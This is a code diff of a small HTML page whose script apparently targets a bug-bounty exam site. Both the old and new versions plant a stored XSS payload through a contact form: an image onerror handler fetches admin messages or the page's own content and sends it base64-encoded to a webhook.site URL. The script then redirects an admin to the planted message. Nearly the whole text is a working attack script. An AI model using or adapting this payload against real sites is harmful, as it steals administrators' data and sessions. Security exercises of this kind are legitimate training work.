@@ -5,35 +5,33 @@
         const webhook = "https://webhook.site/c1a55b0c-1861-47a1-90bc-f341746b4c27";
         const target = "https://api-bugbounty-exam.hashacademy.co/api/contact/submit";
         
-        // The payload that successfully got you the flag before
-        const xssPayload = `<img src=x onerror="fetch('/api/admin/messages/69ea47fabee6d6b7c6645a43').then(r=>r.text()).then(t=>fetch('${webhook}',{method:'POST',mode:'no-cors',body:btoa('EXAM_FLAG:'+t)}))">`;
+        // This payload grabs its OWN page content and sends it to you
+        const xssPayload = `<img src=x onerror=\"fetch(window.location.href).then(r=>r.text()).then(t=>fetch('${webhook}',{method:'POST',mode:'no-cors',body:btoa(t)}))\">`;
 
-        async function exploit() {
-            // Step 1: Submit the message
+        async function launch() {
+            // 1. Submit the message
             const response = await fetch(target, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    "name": "Saja",
-                    "email": "research@seoulaura.com",
-                    "subject": "Urgent Report",
+                    "name":"test",
+                    "email":"jikuxn9@gmail.com",
+                    "phone":"",
+                    "subject":"Urgent: Session Verification",
                     "message": xssPayload,
-                    "category": "technical",
-                    "priority": "high"
+                   "category":"general","priority":"medium"
                 })
             });
 
             const result = await response.json();
-            const msgId = result.data.id;
+            const newId = result.data.id; // This is the new ID!
 
-            // Step 2: Force the admin to view the message to trigger 'onerror'
-            // We'll try the inbox first, then the specific message
+            // 2. Redirect admin to the NEW message
             setTimeout(() => {
-                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
+                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/view/" + newId;
             }, 1000);
         }
-
-        exploit();
+        launch();
     </script>
 </body>
 </html>
